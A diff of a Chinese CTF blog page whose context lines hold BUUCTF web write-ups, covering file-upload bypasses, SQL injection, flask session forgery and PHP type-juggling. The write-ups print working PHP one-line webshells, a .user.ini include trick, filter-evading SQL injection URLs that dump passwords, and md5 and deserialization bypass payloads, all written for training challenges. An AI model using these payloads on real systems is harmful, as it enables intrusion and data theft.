+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712150731.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712150829.png"></p>
 <p>发现只能上传image，bp抓包依次尝试文件后缀名修改，content-type修改、文件名%00截断，添加文件头都失败</p>
 <p>然后更改文件名为xx.phtml,，phtml是嵌入了php代码的html文件，尝试上传，请求体中的内容仍然是普通的一句话木马文件</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712151252.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712151252.png"></p>
 <p>检测到<code>&lt;?</code>请求体中的内容需要更改为：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;script language="php"&gt;eval($_POST['shell']);&lt;/script&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -1236,20 +1236,20 @@ print(hash.hexdigest())<span aria-hidden="true" class="line-numbers-rows"><span>
 <pre class="line-numbers language-none"><code class="language-none">GIF89a
 &lt;script language="php"&gt;eval($_POST['shell']);&lt;/script&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712151704.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712151704.png"></p>
 <p>上传成功，用后门软件连接即可，链接地址经过测试在：</p>
 <pre class="line-numbers language-none"><code class="language-none">http://eb74e5c1-2c38-4013-8035-e32ba42d81a4.node4.buuoj.cn/upload/shell.phtml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712151942.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210712152026.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712151942.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210712152026.png"></p>
 <h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><h2 id="知识点-15"><a href="#知识点-15" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>备份文件泄露</li>
 <li>反序列漏洞</li>
 </ul>
 <h2 id="过程-15"><a href="#过程-15" class="headerlink" title="过程"></a>过程</h2><p>主页：（提示我们存在备份文件），扫一下常见备份目录</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210714094451.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210714094451.png"></p>
 <p>发现<code>www.zip</code>，打开源码，在<code>index.php</code>发现有个存在反序列化漏洞</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210714094935.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210714094935.png"></p>
 <p>然后在<code>class.php</code>中可以看到，如果满足两个条件：</p>
 <ul>
 <li>password的值等于<code>100</code></li>
@@ -1278,11 +1278,11 @@ print(hash.hexdigest())<span aria-hidden="true" class="line-numbers-rows"><span>
 <li>文件上传前端校验</li>
 <li>.phtml的用法</li>
 </ul>
-<h2 id="过程-16"><a href="#过程-16" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210715105425.png"></p>
+<h2 id="过程-16"><a href="#过程-16" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210715105425.png"></p>
 <p>在主页是一个上传点，直接上传一个shell.php，发现弹窗提示，只能上三种类型的文件</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210715105541.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210715105541.png"></p>
 <p>一番查看，是前端校验，删除事件，继续上传shell.php，抓包分析：</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210715110642.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210715110642.png"></p>
 <p>.php后缀的文件仍然不能上传，然后试一试更改content-type，添加文件头，以及%00阶段，依然不行，然后上传一个.phtml的文件，发现上传成功，再将请求头中的内容改为</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;script language='php'&gt;@eval($_POST['a']);&lt;/script&gt;
 &lt;script language='php'&gt;system('cat /flag');&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -1292,32 +1292,32 @@ print(hash.hexdigest())<span aria-hidden="true" class="line-numbers-rows"><span>
 <li>双写绕过</li>
 </ul>
 <h2 id="过程-17"><a href="#过程-17" class="headerlink" title="过程"></a>过程</h2><p>主页是一个登录框</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716090603.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716090603.png"></p>
 <p>随便输入两个参数，发现是传入的是get型参数</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716090738.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716090738.png"></p>
 <p>首先注入肯定存在，先尝试联合查询注入：</p>
 <pre class="line-numbers language-none"><code class="language-none">check.php?username=admin%27+union+select+1%2C2%2C3%23&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>失败，双写union 和 select可绕过</p>
 <pre class="line-numbers language-none"><code class="language-none">check.php?username=admin%27+ununionion+seselectlect+1%2C2%2C3%23&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716091931.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716091931.png"></p>
 <p>登陆成功，将参数admin置为假，可以看到页面有显示位置：</p>
 <pre class="line-numbers language-none"><code class="language-none">check.php?username=-admin%27+ununionion+seselectlect+1%2C2%2C3%23&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716092158.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716092158.png"></p>
 <p>然后尝试注入</p>
 <pre class="line-numbers language-none"><code class="language-none">/check.php?username=1' ununionion selselectect 1,(selselectect group_concat(table_name) frofromm infoorrmation_schema.tables whwhereere table_schema=database()),3 %23&amp;password=1111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716093923.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716093923.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">check.php?username=1' ununionion selselectect 1,(seselectlect group_concat(passwoorrd) frfromom b4bsql),3 %23&amp;password=1111<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210716093839.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210716093839.png"></p>
 <h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><h2 id="知识点-18"><a href="#知识点-18" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>备份文件泄露</li>
 <li>php中的弱类型比较</li>
 </ul>
-<h2 id="过程-18"><a href="#过程-18" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210717203200.png"></p>
+<h2 id="过程-18"><a href="#过程-18" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210717203200.png"></p>
 <p>使用扫描软件扫一下目录，扫到/index.php.bak</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
 include_once "flag.php";
@@ -1344,18 +1344,18 @@ else {
 <li>双等于 弱比较</li>
 </ul>
 <p>所以直接传入123就可以了</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210717205906.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210717205906.png"></p>
 <h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h2 id="知识点-19"><a href="#知识点-19" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>flask session伪造</li>
 </ul>
 <h2 id="过程-19"><a href="#过程-19" class="headerlink" title="过程"></a>过程</h2><p>主页，有注册点和登陆点：</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718093410.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718093410.png"></p>
 <p>登陆点，测试了一下，没有发现sql注入，然后我们随便注册一个账户123 123，登陆看看</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718094018.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718094018.png"></p>
 <p>登陆成功之后，有个提示，说明得使用admin账户登陆之后才能得到flag</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718094535.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718094535.png"></p>
 <p>changepassword，这里发现源码</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718094434.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718094434.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">@app.route('/code')
 def get_code():
 
@@ -1417,12 +1417,12 @@ def decryption(payload):
 if __name__ == '__main__':
     print(decryption(sys.argv[1].encode()))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718095634.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718095809.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718095634.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718095809.png"></p>
 <p>这里伪造session还需要知道SECRET_KEY，我们在config.py中发现里SECRET_KEY</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718100442.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718100442.png"></p>
 <p>index.html文件：</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718100524.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718100524.png"></p>
 <p>发现只要session[‘name’] == ‘admin’，就能得到flag</p>
 <p>然后贴出一个flask session加密的脚本 <a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a><br>利用刚刚得到的SECRET_KEY，在将解密出来的name改为admin，最后用脚本生成我们想要的session</p>
 <pre class="line-numbers language-none"><code class="language-none">{'_fresh': True, '_id': b'33acffdbb8da98c01ab3379ec972f38ced401262f499f628df3eb2a4d06b135ce39867685db5b7525c69ea0e5bc5027c17bf9f7ee1af9721445ac5db6856faf0', 'csrf_token': b'0748bf465b7e203bb622dc868a10a6f8580bf62f', 'image': b'mLzK', 'name': '123', 'user_id': '10'}
@@ -1430,18 +1430,18 @@ if __name__ == '__main__':
 
 
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718101416.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718101416.png"></p>
 <p>把得到的session在浏览器中替换即可</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210718101549.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210718101549.png"></p>
 <h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><h2 id="知识点-20"><a href="#知识点-20" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>strcmp函数绕过特性</li>
 <li>cookie中修改标识用户身份的字段</li>
 </ul>
 <h2 id="过程-20"><a href="#过程-20" class="headerlink" title="过程"></a>过程</h2><p>主页，没发现可用信息</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723100513.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723100513.png"></p>
 <p>右上角菜单，发现一个页面</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723100440.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723100554.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723100440.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723100554.png"></p>
 <p>满足条件</p>
 <ul>
 <li>使用正确的金额购买flag</li>
@@ -1476,9 +1476,9 @@ if (isset($_POST['password'])) {
 <p>修改用户身份</p>
 </blockquote>
 <p>先抓包</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723101923.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723101923.png"></p>
 <p>cookie中的参数修改为1</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723102510.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723102510.png"></p>
 <p>这里就参考大佬，可以使用strcmp和科学计数法绕过</p>
 <blockquote>
 <p>#strcmp</p>
@@ -1486,18 +1486,18 @@ if (isset($_POST['password'])) {
 <p>解释参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/cherrie007/article/details/77473817">https://blog.csdn.net/cherrie007/article/details/77473817</a></p>
 <pre class="line-numbers language-none"><code class="language-none">money[]=1&amp;password=404a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723102730.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723102730.png"></p>
 <blockquote>
 <p>#科学计数法</p>
 </blockquote>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723102843.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723102843.png"></p>
 <h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="知识点-21"><a href="#知识点-21" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>md5 bypass（数组返回false）</li>
 </ul>
 <h2 id="过程-21"><a href="#过程-21" class="headerlink" title="过程"></a>过程</h2><p>主页，是这么个框框</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723145213.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723145213.png"></p>
 <p>抓包发现提示</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723145452.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723145452.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">select * from 'admin' where password=md5($pass,true)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>16 位 md5 常见套路，输入密码 <code>ffifdyop</code>，登录即可。这是因为它的原始字符串导致了<code>' or 1=1</code> 的 SQL 注入，相当于所谓的万能密码登录。请参考：</p>
@@ -1516,7 +1516,7 @@ if($a != $b &amp;&amp; md5($a) == md5($b)){
 <p>又是典型的 md5 bypass，因为 <code>md5()</code> 或者 <code>sha1()</code> 之类的函数计算的是一个字符串的哈希值，对于数组则返回 false，如果 <code>$a</code> 和 <code>$b</code> 都是数组则双双返回 FALSE, 两个 FALSE 相等得以绕过。payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">/levels91.php?a[]=1&amp;b[]=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723150159.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723150159.png"></p>
 <p>得到代码</p>
 <pre class="line-numbers language-none"><code class="language-none"> &lt;?php
 error_reporting(0);
@@ -1530,7 +1530,7 @@ if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_PO
 
 <pre class="line-numbers language-none"><code class="language-none">param1[]=1&amp;param2[]=2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210723150558.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210723150558.png"></p>
 <p>一些md5值</p>
 <p>0e开头的md5和原值：<br>QNKCDZO<br>0e830400451993494058024219903391<br>s878926199a<br>0e545993274517709034328855841020<br>s155964671a<br>0e342768416822451524974117254469<br>s214587387a<br>0e848240448830537924465865611904<br>s214587387a<br>0e848240448830537924465865611904<br>s878926199a<br>0e545993274517709034328855841020<br>s1091221200a<br>0e940624217856561557816327384675<br>s1885207154a</p>
 <h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><h2 id="知识点-22"><a href="#知识点-22" class="headerlink" title="知识点"></a>知识点</h2><ul>
@@ -1616,7 +1616,7 @@ class Flag{  //flag.php
 <p>payload:</p>
 <pre class="line-numbers language-none"><code class="language-none">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210724154127.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210724154127.png"></p>
 <h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><h2 id="知识点-23"><a href="#知识点-23" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li><p>图片马制作 copy 01.jpg/a + 02.php/b test.jpg</p>
 </li>
@@ -1624,17 +1624,17 @@ class Flag{  //flag.php
 </li>
 </ul>
 <h2 id="过程-23"><a href="#过程-23" class="headerlink" title="过程"></a>过程</h2><p>主页是一个上传页面</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725101158.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725101158.png"></p>
 <p>上传<code>.php</code>，提示非法后缀</p>
 <p>尝试将.php后缀改成.jpg，提示过滤了<code>&lt;?</code></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725102113.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725102113.png"></p>
 <p>正常上传图片，上传成功</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725101841.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725101841.png"></p>
 <p>修改请求体中的一句话木马内容为</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;script language="php"&gt;eval($_GET['cmd']);&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>上传后，页面返回提示</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725102518.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725102518.png"></p>
 <p>搜罗资料</p>
 <blockquote>
 <p>exif_imagetype<br>(PHP 4 &gt;= 4.3.0, PHP 5, PHP 7, PHP 8)</p>
@@ -1643,59 +1643,59 @@ class Flag{  //flag.php
 <p>exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p>
 </blockquote>
 <p>这个函数就是检查文件头，直接制作图片马</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725110330.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725110330.png"></p>
 <p>成功上传，但是此时还无法执行PHP脚本，接着我们可以上传一个<code>user.ini</code>的文件（经过测试，没有过滤该后缀），我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell,关于该文件详见：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
 <p>然后我们去上传，文件名为<code>.user.ini</code></p>
 <pre class="line-numbers language-none"><code class="language-none">GIF89a
 auto_prepend_file=test.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>蚁剑连接即可</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725110609.png"></p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210725110656.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725110609.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210725110656.png"></p>
 <h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><h2 id="知识点-24"><a href="#知识点-24" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>绕过一些简单的过滤</li>
 <li>right()</li>
 </ul>
 <h2 id="过程-24"><a href="#过程-24" class="headerlink" title="过程"></a>过程</h2><p>主页是一个登陆页面</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809172300.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809172300.png"></p>
 <p>过滤了关键字 and、=、空格、union等</p>
 <blockquote>
 <p>查库</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809172536.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809172536.png"></p>
 <blockquote>
 <p>查表</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809172714.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809172714.png"></p>
 <blockquote>
 <p>查字段</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809172752.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809172752.png"></p>
 <blockquote>
 <p>dump数据</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809172820.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809172820.png"></p>
 <p>不是最终结果，上网搜罗，用right()语句</p>
 <pre class="line-numbers language-none"><code class="language-none">check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))%23&amp;password=21<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210809173123.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210809173123.png"></p>
 <p>拼接两段即得flag</p>
 <p>flag{f1b0debe-86a4-4b3b-a1f0-bf67f3c734d9}</p>
 <h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><h2 id="知识点-25"><a href="#知识点-25" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>fuzz</li>
 <li>python盲注脚本</li>
 </ul>
-<h2 id="过程-25"><a href="#过程-25" class="headerlink" title="过程"></a>过程</h2><p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210810154849.png"></p>
+<h2 id="过程-25"><a href="#过程-25" class="headerlink" title="过程"></a>过程</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/20210810154849.png"></p>
 <p>fuzz一哈</p>
-<p><img src="https://gitee.com/southerose/PictureBed/raw/master/img/1937992-20200911094122880-1747349205.png"></p>
+<p><img src="https://github.com/southerose/PictureBed/raw/master/img/1937992-20200911094122880-1747349205.png"></p>
 <p>一个搜索框，搜索框输入1或2会返回结果，其他都返回bool(false)。过滤了union、and、or、空格等</p>
 <p>贴上脚本：</p>
 <pre class="line-numbers language-none"><code class="language-none">import requests
@@ -1797,12 +1797,12 @@ for i in range(1, 60):
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/wp/">
-                                    <span class="chip bg-color">wp</span>
-                                </a>
-                            
                                 <a href="/tags/buuctf/">
                                     <span class="chip bg-color">buuctf</span>
+                                </a>
+                            
+                                <a href="/tags/wp/">
+                                    <span class="chip bg-color">wp</span>
                                 </a>
                             
                                 <a href="/tags/web/">
@@ -1983,7 +1983,7 @@ for i in range(1, 60):
                 <a href="/2021/08/21/yi-xie-ctf-ti-mu/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220316165400.png" class="responsive-img" alt="一些CTF题目">
+                        <img src="https://github.com/southerose/PictureBed/raw/master/img/20220316165400.png" class="responsive-img" alt="一些CTF题目">
                         
                         <span class="card-title">一些CTF题目</span>
                     </div>
@@ -2028,12 +2028,12 @@ for i in range(1, 60):
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/20/ctfhub-misc-wp/">
+                <a href="/2021/06/20/buuctf-misc-wp/">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620142951.png" class="responsive-img" alt="ctfhub-misc-wp">
+                        <img src="https://github.com/southerose/PictureBed/raw/master/img/20210620102558.png" class="responsive-img" alt="buuctf-misc-wp">
                         
-                        <span class="card-title">ctfhub-misc-wp</span>
+                        <span class="card-title">buuctf-misc-wp</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -2061,8 +2061,8 @@ for i in range(1, 60):
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctfhub/">
-                        <span class="chip bg-color">ctfhub</span>
+                    <a href="/tags/buuctf/">
+                        <span class="chip bg-color">buuctf</span>
                     </a>
                     
                     <a href="/tags/misc/">
